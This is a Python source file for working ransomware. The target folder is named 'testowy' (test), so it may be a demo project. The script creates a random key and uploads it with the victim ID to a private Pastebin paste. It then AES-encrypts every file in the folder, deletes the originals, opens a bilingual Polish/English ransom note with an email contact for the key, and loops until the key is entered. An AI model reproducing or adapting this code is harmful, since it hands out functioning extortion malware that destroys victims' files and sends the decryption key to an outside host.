from pbwrap import Pastebin
import pyAesCrypt, os, getpass, easygui as g, webbrowser, random

characters = "abcdefghijklmnopqrstuvwxyz"
characters_upper = characters.upper()
numbers = "0123456789"

ID = random.randint(0,9999)
all = characters + characters_upper + numbers
password = "".join(random.sample(all, 10))

current_user = getpass.getuser()

os.chdir("C:\\Users\\" + current_user + "\\Desktop\\testowy")

def encrypt():
    for i in os.listdir():
        pyAesCrypt.encryptFile(i, "encrypted " + i, password)
        os.unlink(i)

def decrypt():
    for i in os.listdir():
        pyAesCrypt.decryptFile(i, "decrypted " + i, password)
        os.unlink(i)

def show_message():
    message = '''
    <html>
        <body>
            <h1>O Nie! Twoje Pliki zostały zaszyfrowane! / Oh no! Your files are encrypted!</h1>
            <h2>Padłeś ofiarą ransomware! / You are a victim of ransomware!<h2>
            <h2>Jak mogę odzyskać moje pliki? / How can I recover my files?</h2>
            <h3>W tym momencie powinieneś mieć otwartą aplikację, w której trzeba wpisać klucz odszyfrowujący pliki. Aby dostać klucz napisz na <kbd>decryptyourfiles7463224@protonmail.com</kbd> i podaj swoje ID. Kiedy wpiszesz klucz twoje pliki powinny się odszyfrować! Powodzenia!</h3>
            <h3>At this point you should have an application open where you need to enter the key that decrypts your files. To get the key write to <kbd>decryptyourfiles7463224@protonmail.com</kbd> and give your ID. Once you enter the key your files should decrypt! Good luck!</h3>
            <h3>Twoje ID: %d<h3>
        </body>
        <style>
            body {
                background-color: rgba(255, 0, 0, 0.623);
                font-family: sans-serif;
                text-align: center;
            }
        </style>
    </html>
    '''% ID
    file = open("readme.html", "a")
    file.write(message)
    file.close()
    webbrowser.open("readme.html")

try:
    pb = Pastebin("KEY")
    pb.authenticate("USERNAME", "PASSWORD")
    pb.create_paste(str(ID) + " : " + password, api_paste_private=2, api_paste_name=str(ID), api_paste_expire_date=None,api_paste_format=None)

    encrypt()
    show_message()

    while True:
        if g.enterbox("Wpisz klucz odszyfrowujący! / Enter decryption key!") == password:
            g.msgbox("Dziękujemy za współpracę! Twoje pliki zostaną odszyfrowane! / Thank you for your cooperation! Your files will be decrypted!")
            decrypt()
            break

except ValueError:
    pass